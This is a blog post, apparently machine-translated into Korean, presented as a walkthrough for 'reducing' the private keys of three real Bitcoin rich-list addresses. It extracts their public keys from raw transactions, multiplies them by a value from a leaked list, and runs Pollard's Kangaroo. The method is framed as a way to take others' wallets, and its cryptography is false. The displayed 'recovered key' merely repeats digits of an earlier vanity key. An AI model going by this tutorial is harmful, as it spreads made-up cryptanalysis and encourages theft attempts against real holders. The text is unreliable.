# ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기

<!-- wp:heading {"level":1} -->
<h1></h1>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/zu2yiaZ_LOs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener">이번 글에서는 "BLOCKCHAIN ​​FOLBIT LEAKS"</a>&nbsp;목록에서 유출된 개인키 와&nbsp;<a href="https://en.wikipedia.org/wiki/Unspent_transaction_output" target="_blank" rel="noreferrer noopener">"UTXO"</a>&nbsp;에서 퍼블릭키만 알면 프라이빗키를 줄이는 방법에 대해 알아보도록 하겠습니다&nbsp;.&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/08ReducePrivateKey" target="_blank" rel="noreferrer noopener">실험 부분에서는 08ReducePrivateKey</a><br>스크립트를 사용&nbsp;하고 비트코인 ​​지갑을 복원합니다.<a href="https://github.com/demining/CryptoDeepTools/tree/main/08ReducePrivateKey" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><u>타원 곡선 스칼라 곱셈은</u></em><code>P</code>&nbsp;곡선 시간에점을 추가하는 작업입니다<code>k</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Q=kP=P+P+P, k times</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br><code>P</code>는&nbsp;<em>타원 곡선 위의 한 점</em>&nbsp;이며&nbsp;<em>큰 자연수</em><code>k</code>&nbsp;입니다&nbsp;.<em></em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>기본 구현에서&nbsp;<code>ECC</code>스칼라 곱셈은 주요 계산 작업입니다.&nbsp;효율성 향상의 핵심 요소는&nbsp;<code>ECC</code>빠른 스칼라 곱셈의 구현입니다.&nbsp;<a href="https://habr.com/ru/post/680932/" target="_blank" rel="noreferrer noopener"><em><u>따라서 많은 연구자들이 가속 스칼라 곱셈에 대한</u></em></a>&nbsp;다양한 연구를 제안해왔다&nbsp;.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2>ECPy 라이브러리를 사용해 봅시다</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>ECPy는 다음을 제공합니다.</h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>ECDSA 서명</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Ed25519 서명</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ECScnorr 서명</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Borromean 서명</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>포인트 운영</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>많은 연구에서 우리는 라이브러리를 사용&nbsp;</em><code>ECPy</code><em>하고</em><code>Google Colab</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong>[TerminalGoogleColab]</strong></a>&nbsp;열기<a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="http://git%20clone%20https//github.com/demining/CryptoDeepTools.git" target="_blank" rel="noreferrer noopener"><strong>"08ReducePrivateKey"</strong></a>&nbsp;저장소를 사용합시다<a href="http://git%20clone%20https//github.com/demining/CryptoDeepTools.git" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/08ReducePrivateKey/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/201/da1/f9f/201da1f9f8e93fbbeae07e8e9af7723e.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>ECPy 라이브러리를 설치합니다.</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip3 install ECPy</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/d7c/1d7/b35/d7c1d7b35f8246398d24a4e40744a43e.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Python</em>&nbsp;스크립트:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">maxwell.py</a>&nbsp;, 터미널에서&nbsp;<em>저장</em>&nbsp;<code>код</code>&nbsp;및 실행<code>Google Colab</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from ecpy.curves     import Curve,Point

cv = Curve.get_curve('secp256k1')
G  = Point(0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,
           0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8,
           cv)
x  = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a1

PUBKEY  = x*G

print(PUBKEY)</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>실행 명령:</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 maxwell.py</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/b6b/c19/0fe/b6bc190fe89cda2172f7b29a30aeaf16.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>결과:</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63 , 0xc0c686408d517dfd67c2367651380d00d126e4229631fd03f8ff35eef1a61e3c)
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>x좌표에 주목</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>x value = 3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63

0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>이&nbsp;<em>공개 키를&nbsp;</em><a href="https://bitcointalk.org/index.php?topic=1118704.msg11862486#msg11862486" target="_blank" rel="noreferrer noopener"><u>"맥스웰의 배니티 공개 키"</u></a>&nbsp;라고 합니다.<a href="https://bitcointalk.org/index.php?topic=1118704.msg11862486#msg11862486" target="_blank" rel="noreferrer noopener"><u></u></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0 --&gt; 0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63, 0x3f3979bf72ae8202983dc989aec7f2ff2ed91bdd69ce02fc0700ca100e59ddf3
0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a1 --&gt; 0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63, 0xc0c686408d517dfd67c2367651380d00d126e4229631fd03f8ff35eef1a61e3c

p = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

((p-1)/2) = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0

0200000000000000000000003B78CE563F89A0ED9414F5AA28AD0D96D6795F9C63
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":4} -->
<h4>이 공개 키로 돌아올 것입니다!</h4>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>실험적인 부분으로 넘어 갑시다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://bitinfocharts.com/top-100-richest-bitcoin-addresses.html" target="_blank" rel="noreferrer noopener"><strong>우리는 Bitcoin Rich List</strong></a>&nbsp;의&nbsp;잔액&nbsp;<code>100 BTC</code>&nbsp;<em>또는 그 이상을 가진 3개의 다른 Bitcoin 주소를 가지고 있습니다.</em><a href="https://bitinfocharts.com/top-100-richest-bitcoin-addresses.html" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1KpHWkpG7BGxDuSJKYPYVvNSC6womEZdTu" target="_blank" rel="noreferrer noopener">1KpHWkpG7BGxDuSJKYPYVvNSC6womEZdTu</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm" target="_blank" rel="noreferrer noopener">1MjGyKiRLzq4WeuJKyFZMmkjAv7rH1TABm</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.blockchain.com/btc/address/1GrTCkqqcXhVTXoQkPJjU5LuFKgAvC3iqJ" target="_blank" rel="noreferrer noopener">1GrTCkqqcXhVTXoQkPJjU5LuFKgAvC3iqJ</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>이 비트코인 ​​주소를 가져&nbsp;<code>UTXO</code>오면 이제 3개의 서명이 있습니다&nbsp;<code>ECDSA</code>&nbsp;<em>(Apply scripts&nbsp;</em><a href="https://github.com/demining/CryptoDeepTools/tree/main/01BlockchainGoogleDrive" target="_blank" rel="noreferrer noopener"><em>01BlockchainGoogleDrive</em></a><em>&nbsp;).</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://blockchain.info/rawtx/c1ea2c9e48ce632488817781f89730d77cd4121f1c8f70a4be44d2a15e8e08d0?format=hex" target="_blank" rel="noreferrer noopener"><strong>c1ea2c9e48ce632488817781f89730d77cd4121f1c8f70a4be44d2a15e8e08d0</strong></a><br><a href="https://blockchain.info/rawtx/37dadae30c6f7c6c4a2c930db979494783005a8e94d6861039fed21e3fa859b9?format=hex" target="_blank" rel="noreferrer noopener"><strong>37dadae30c6f7c6c4a2c930db979494783005a8e94d6861039fed21e3fa859b9</strong></a><br><a href="https://blockchain.info/rawtx/9dacfc8243109475383d5b30e8d5f0ba23d023bd47649064c208d4586b278436?format=hex" target="_blank" rel="noreferrer noopener"><strong>9dacfc8243109475383d5b30e8d5f0ba23d023bd47649064c208d4586b278436</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>RawTX</code>세 가지 비트코인 ​​주소&nbsp;얻기</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000017fbdd4c9991d0ba4fb0a0c06f6933442c17678bce6dfa4bf80e22ed530bb933c010000008a47304402206d0ab626a7e477c27602ed63b2651517af077e6f3fafda671dd9952dfcb5f0b90220168eb51a48ce7496a699a800299f15638e0a7f36ae84e84e26df0cd2a280a70e014104b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4feffffff0240597307000000001976a914211090b628fa6351fa8240232e3c2753fd5eece588ac700369d2050000001976a914ce639943ce1602e30b249faf74388ee0eeb1d3c588ac84b90700
01000000014666d430766d611cc7f2c21494e68e463ac4be8bb2f70b91693728324849e1c3010000008a473044022057a02a4abc38e2e3e1809b05402cf52faef7e101d6364d43bb0305f8796b0fb202203d1934a016c91072ffe137575734454161284ab3371a0cfc6767db7f27f24a75014104ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240cffffffff01b0feea0b000000001976a9148300ab0caebb6e85cf9e6b287a57924d1ac7c82f88ac00000000
01000000019d8e5e1bfac780b813e41517926aca95048e1dea92cbbe2a98475ff53ad38ccd000000008c493046022100c7b76326879a5ec7df2ffedb292a45c13c6f154982fc2cd7e05f0d0d0dce2d05022100d7fd43416608eaeb6356f04b601ac6edd23e0f82de44689fe5a7aa2f576637a001410480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56cffffffff01a93de702000000001976a914119fb35bad07974c1a8d47d210ca3048bb13be8788ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>필요한 모든 모듈을 설치합니다.</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>bitcoin
ecdsa
utils
base58


pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/489/a48/5af/489a485af916d20a567f6675da99fe06.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/breakECDSA.py" target="_blank" rel="noreferrer noopener">breakECDSA.py</a>&nbsp;스크립트를 사용하여&nbsp;비트코인 ​​주소의&nbsp;<em>공개 키를</em>&nbsp;찾습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000017fbdd4c9991d0ba4fb0a0c06f6933442c17678bce6dfa4bf80e22ed530bb933c010000008a47304402206d0ab626a7e477c27602ed63b2651517af077e6f3fafda671dd9952dfcb5f0b90220168eb51a48ce7496a699a800299f15638e0a7f36ae84e84e26df0cd2a280a70e014104b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4feffffff0240597307000000001976a914211090b628fa6351fa8240232e3c2753fd5eece588ac700369d2050000001976a914ce639943ce1602e30b249faf74388ee0eeb1d3c588ac84b90700 &gt;&gt; PublicKeys.txt
python2 breakECDSA.py 01000000014666d430766d611cc7f2c21494e68e463ac4be8bb2f70b91693728324849e1c3010000008a473044022057a02a4abc38e2e3e1809b05402cf52faef7e101d6364d43bb0305f8796b0fb202203d1934a016c91072ffe137575734454161284ab3371a0cfc6767db7f27f24a75014104ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240cffffffff01b0feea0b000000001976a9148300ab0caebb6e85cf9e6b287a57924d1ac7c82f88ac00000000 &gt;&gt; PublicKeys.txt
python2 breakECDSA.py 01000000019d8e5e1bfac780b813e41517926aca95048e1dea92cbbe2a98475ff53ad38ccd000000008c493046022100c7b76326879a5ec7df2ffedb292a45c13c6f154982fc2cd7e05f0d0d0dce2d05022100d7fd43416608eaeb6356f04b601ac6edd23e0f82de44689fe5a7aa2f576637a001410480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56cffffffff01a93de702000000001976a914119fb35bad07974c1a8d47d210ca3048bb13be8788ac00000000 &gt;&gt; PublicKeys.txt
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/afb/ec8/169/afbec8169caf989b8550aadad4dd3e59.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>출시 후 우리는&nbsp;3개의 비트코인 ​​주소 모두에 대한&nbsp;<em>공개 키를 받습니다.</em></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>결과는 다음 파일에 저장됩니다: PublicKeys.txt</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Откроем файл: PublicKeys.txt

cat PublicKeys.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/773/4e4/670/7734e4670c08dae7004135f681bd0942.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>PUBKEY = 04b3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97fe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4
PUBKEY = 04ea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240c
PUBKEY = 0480edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2b5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56c
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>이러한 공개 키를 좌표점(x,y)의 형태로 만들어 봅시다.</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0xb3fdc0e84cd77cd018ced1fdd3ea4110d6beb942cfd38c0f6feaffc246e08b97 , 0xfe779e87e4743f55168a476433100abd4cac064be5915cf828185319480b3fb4)
(0xea7c9e85d4fb089e0b2901cd5c77f3149aa4cf711ed29a3318a4e153a67ea9cd , 0x1a22c24c8e05b66eb122db74d26fddf2cb184033fb586743ea330e15eeb8240c)
(0x80edda62d055008c28de19f4908cd052ccf63a10d708b5866b7a5b340bde49e2 , 0xb5e7be50412afb83a6c774ed5b45fdf9ad5cbbd98b7f1964f1cb180b7bc6d56c)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>좌표점을&nbsp;<code>(x,y)</code>파일에 저장:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/Coordinates.txt" target="_blank" rel="noreferrer noopener"><strong>Coordinates.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>블록체인 폴빗 유출</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener"><strong>"BLOCKCHAIN ​​FOLBIT LEAKS"</strong></a>&nbsp;에서 알려진 블록체인 유출 목록을 열어보자<code>2019 год</code><a href="https://pastebin.com/eLMYtzV8" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/5b1/643/cb0/5b1643cb05baa67368df5f79277135ae.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>값을 복사해 보겠습니다.</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/bbb/497/cfc/bbb497cfc8a2ec00af285f19851e6ce8.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>(x,y)</code>이제 누출 값을 적용하여&nbsp;<strong>모든</strong>&nbsp;포인트 좌표에 대해 스칼라 곱셈을 수행해 보겠습니다 .<strong></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/maxwell.py" target="_blank" rel="noreferrer noopener">maxwell.py</a>&nbsp;코드를 변경&nbsp;하고 이름을&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/scalarEC.py" target="_blank" rel="noreferrer noopener">scalarEC.py 로 변경합니다.</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>추가하자<code>with open("Coordinates.txt", "rt") as base:</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>모든 새 좌표는 파일에 저장됩니다.<code>SaveBase.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>B = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>B</code>목록의 값을 코드에&nbsp;추가하고&nbsp;<em>Python</em>&nbsp;스크립트로 저장해 보겠습니다.&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/scalarEC.py" target="_blank" rel="noreferrer noopener">scalarEC.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>from ecpy.curves     import Curve,Point

with open("Coordinates.txt", "rt") as base:
    for line in base.read().splitlines():
        Gx, Gy = map(lambda v: int(v, 16), line&#91;1: -1].split(" , "))

        cv = Curve.get_curve('secp256k1')
    
        P  = Point(Gx,Gy,cv)

        B  = 0xdac19ec586ea8aa454fd2e7090e3244cdf75a73bdb1aa970d8b0878e75df3cae

        A  = B*P

        with open("SaveBase.txt", "a") as file:
            file.write(str(A))
            file.write("\n")</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>스크립트를 실행해 봅시다:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 scalarEC.py

Результат сохранился в файле: SaveBase.txt

Откроем файле: SaveBase.txt

cat SaveBase.txt
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/cf3/657/dd0/cf3657dd0b79a3ce0e5cdaa44120e4ba.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>(0x92b9eeebb8c4fa108359bd31367e36b7fe65b4a7e06d533b476dee097572a4c0 , 0x4d2beb1835a2f8b85e3f61d32094dbf0b4c7a212bee42ee4612193c0653c6e56)
(0x65304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e7 , 0x7af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958)
(0x433c15b724948371877dd3c1014d59d1a13d76a29e4948903623a74767736b97 , 0x13f15f3bb28a4766952e10da9717aa3cc0bad90b0414f483718531d584721ea3)
</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>모든 좌표 포인트에 대한 누설 값으로 스칼라를 곱한 후&nbsp;<em><u>새 포인트를 얻습니다</u></em><code>(x,y)</code>&nbsp;.<em><u></u></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3>이제 이 좌표를 압축되지 않은 공개 키 형식으로 다시 작성해 보겠습니다.</h3>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2>이 공개 키를 살펴보겠습니다.</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0465304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e77af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener">이제 Pollard의 Kangaroo</a>&nbsp;방법을 사용하여 개인 키를 찾을 수 있습니다.<a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이전에&nbsp;<a href="https://cryptodeep.ru/kangaroo/" target="_blank" rel="noreferrer noopener"><em>"Pollard의 Kangaroo는 알려진 범위에서 secp256k1 PRIVATE KEY + NONCES의 이산 로그에 대한 솔루션을 찾습니다."</em></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Python</em>&nbsp;-script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener">kangaroo.py</a>&nbsp;의&nbsp;<em><u>새 코드를</u></em>&nbsp;사용해 봅시다.<code>Pollard's Kangaroo</code><code>Telariust</code><em></em><a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3>다음 명령을 사용하여 gmpy2 모듈을 설치합니다.</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python-gmpy2</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/0f1/448/125/0f144812547a5d8e84cf66ee71b0c6d6.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/764/6ac/808/7646ac808066d138af9c5b5380baf507.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>다음으로&nbsp;<em>Python</em>&nbsp;스크립트를 실행합니다:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/08ReducePrivateKey/kangaroo.py" target="_blank" rel="noreferrer noopener">kangaroo.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 kangaroo.py 32 0465304D24C0EDC862843587A96EA700F86E9E70E7801AC7DF9EFD2DE84230C3E77AF6D83573849D2368A021E835C5768E1B791C0C1B4CFAFB9795058DF5F27958
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/25d/4cd/dd4/25d4cddd4d35d1fc6331dca485cff638.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/617/c13/58f/617c1358faaf9104fc774fda67fbf9d1.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>터미널에서 다음을 얻을 수 있음을 알 수 있습니다&nbsp;<code>"prvkey"</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&#91;prvkey#32] 0x00000000000000000000000000000000000000000000000000000000795f9c63
&#91;pubkey#32] 0465304d24c0edc862843587a96ea700f86e9e70e7801ac7df9efd2de84230c3e77af6d83573849d2368a021e835c5768e1b791c0c1b4cfafb9795058df5f27958
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>결과는 다음 파일에 저장됩니다: Privkey.txt</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Откроем файл командой: 

cat Privkey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/94f/145/0a5/94f1450a509aa57879f2864348d1fe4c.png" alt="ECPy + Google Colab 라이브러리를 사용하여 스칼라 곱셈을 통해 개인 키 줄이기"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>00000000000000000000000000000000000000000000000000000000795f9c63</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":3} -->
<h3>공개 키에 대해 축소된 개인 키를 얻었습니다.</h3>
